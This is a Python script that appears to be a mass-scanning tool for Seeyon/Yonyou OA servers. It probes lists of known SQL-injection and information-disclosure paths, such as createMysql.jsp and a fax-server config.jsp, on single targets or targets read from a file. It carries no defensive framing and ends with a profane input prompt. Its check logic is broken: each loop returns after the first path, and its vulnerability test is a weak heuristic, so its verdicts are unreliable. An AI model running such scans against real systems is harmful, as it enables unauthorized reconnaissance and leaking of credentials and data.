import requests

def sqli_exploit(url):
    payload = {1:"/yyoa/common/js/menu/test.jsp?doType=101&S1=",
               2:"/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp",
               3:"/yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=",
               4:"/yyoa/common/selectPersonNew/initData.jsp?trueName=1",
               5:"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=",
               6:"/yyoa/docMgr/superviseAndUrge/loadUrgeInfo.jsp?docIds=1",
               7:"/yyoa/checkWaitdo.jsp?userID=1"}
    for a in payload:
        res = requests.get(url + payload[a])
        if "<script>" not in res.text and res.status_code is 200:
            print("[*]:" + url + " | 存在注入漏洞")
            return
        else:
            print("[*]:" + url + " | 不存在注入漏洞")
            return

def informantion_exploit(url):
    payload = {1:"/yyoa/createMysql.jsp",
               2:"/yyoa/ext/createMysql.jsp",
               3:"/yyoa/assess/js/initDataAssess.jsp",
               4:"/yyoa/ext/trafaxserver/SystemManage/config.jsp",
               5:"/yyoa/common/SelectPerson/reloadData.jsp",
               6:"/yyoa/common/selectPersonNew/initData.jsp?trueName=1"}
    for a in payload:
        res = requests.get(url + payload[a])
        if "<script>" not in res.text and res.status_code is 200:
            print("[*]:" + url + " | 存在信息泄露漏洞")
            return
        else:
            print("[*]:" + url + " | 不存在信息泄露漏洞")
            return

def run(url):
    sqli_exploit(url)
    informantion_exploit(url)

if __name__ == '__main__':

    while True:
        go = input("(1) 单个检测 (2) 批量检测 (exit) 退出程序：")
        if go == 'exit':
            break
        elif go == "1":
            url = input("Please enter url:")
            if url[:4] != 'http':
                url = 'http://' + url
            run(url)
        elif go == "2":
            filepath = input("FilePath:")
            url_list = open(filepath)
            new_url_list = url_list.readlines()
            for url in new_url_list:
                url = url.strip()
                try:
                    run(url)
                except Exception as e:
                    print(e)
                    pass
        else:
            print("别特么瞎几把输入")
